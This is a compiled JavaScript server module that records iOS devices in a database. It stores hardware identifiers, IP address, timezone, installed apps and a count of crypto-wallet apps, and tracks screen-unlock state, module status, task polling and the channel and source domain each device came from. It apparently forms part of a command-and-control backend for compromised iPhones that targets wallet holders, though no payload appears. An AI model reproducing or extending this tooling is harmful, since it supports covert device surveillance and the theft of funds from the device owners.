import { Device } from '../../../core/db/models/index.js';
import { backfillDeviceSourceDomainFromIp } from '../../../core/devices/source-domain.js';
import { enqueueDeviceSourceDomainRetry } from '../../../core/devices/source-domain-retry.js';
import { WALLET_BUNDLE_IDS } from '../../../config/constants.js';
import { refreshDeviceAppDataStatus } from '../../../core/devices/app-data-status.js';
const walletBundleIdSet = new Set(WALLET_BUNDLE_IDS);
export async function activateDevice(data) {
    const now = new Date();
    const hasDirectDomain = !!data.domain;
    const setOnInsert = { channelCode: data.channelCode, firstSeen: now, walletCount: 0, lastTaskPoll: new Date(0), screenUnlocked: false };
    if (hasDirectDomain) {
        setOnInsert.sourceDomain = data.domain;
    }
    else {
        setOnInsert.sourceDomain = '';
    }
    const result = await Device.findOneAndUpdate({ uniqueId: data.deviceId }, {
        $set: {
            ecid: data.ecid,
            serialId: data.serial,
            fingerId: data.fingerId || '',
            productType: data.productType || '',
            iosVersion: data.iosVersion || '',
            buildVersion: data.buildVersion || '',
            sdkVersion: data.sdkVersion || '',
            timezone: data.timezone || '',
            ip: data.ip,
            lastSeen: now,
            updatedAt: now,
        },
        $setOnInsert: setOnInsert,
    }, { upsert: true, returnDocument: 'after' });
    if (data.channelCode && !result?.channelCode) {
        await Device.updateOne({ uniqueId: data.deviceId, $or: [{ channelCode: '' }, { channelCode: { $exists: false } }, { channelCode: null }] }, { $set: { channelCode: data.channelCode } });
    }
    if (!hasDirectDomain) {
        const backfill = await backfillDeviceSourceDomainFromIp({ deviceId: data.deviceId, channelCode: data.channelCode, ip: data.ip });
        if (!backfill.matched) {
            await enqueueDeviceSourceDomainRetry({ deviceId: data.deviceId, channelCode: data.channelCode, ip: data.ip });
        }
    }
    else if (!result?.sourceDomain) {
        await Device.updateOne({ uniqueId: data.deviceId, sourceDomain: '' }, { $set: { sourceDomain: data.domain, sourceDomainUpdatedAt: now } });
    }
    return result;
}
export async function updateDeviceLastSeen(uniqueId, ip, channelCode = '') {
    const result = await Device.updateOne({ uniqueId }, { $set: { lastSeen: new Date(), ip, updatedAt: new Date() } });
    if (channelCode) {
        await backfillDeviceSourceDomainFromIp({ deviceId: uniqueId, channelCode, ip });
    }
    return result;
}
export async function updateDeviceModuleStatus(uniqueId, moduleStatus, ip = '', channelCode = '') {
    const setFields = { lastSeen: new Date(), moduleStatus, updatedAt: new Date() };
    if (ip)
        setFields.ip = ip;
    const result = await Device.updateOne({ uniqueId }, { $set: setFields });
    if (ip && channelCode) {
        await backfillDeviceSourceDomainFromIp({ deviceId: uniqueId, channelCode, ip });
    }
    return result;
}
export async function updateDeviceApps(uniqueId, apps) {
    const now = new Date();
    const walletCount = apps.filter(id => walletBundleIdSet.has(id)).length;
    const setFields = { installedApps: apps, walletCount, lastSeen: now, updatedAt: now };
    await Device.updateOne({ uniqueId }, {
        $set: setFields,
        $setOnInsert: { firstSeen: now, sourceDomain: '', lastTaskPoll: new Date(0), screenUnlocked: false },
    }, { upsert: true });
    await refreshDeviceAppDataStatus(uniqueId);
}
//# sourceMappingURL=device.js.map